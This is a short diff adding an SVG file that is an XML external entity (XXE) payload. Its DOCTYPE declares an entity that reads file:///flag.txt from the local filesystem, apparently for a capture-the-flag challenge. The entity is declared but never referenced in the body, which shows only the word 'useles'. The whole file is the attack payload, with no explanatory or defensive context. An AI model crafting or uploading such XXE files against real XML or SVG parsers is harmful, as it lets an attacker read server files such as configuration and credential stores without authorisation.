@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE cool [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
+
+<svg>
+   <text>useles</text>
+</svg>
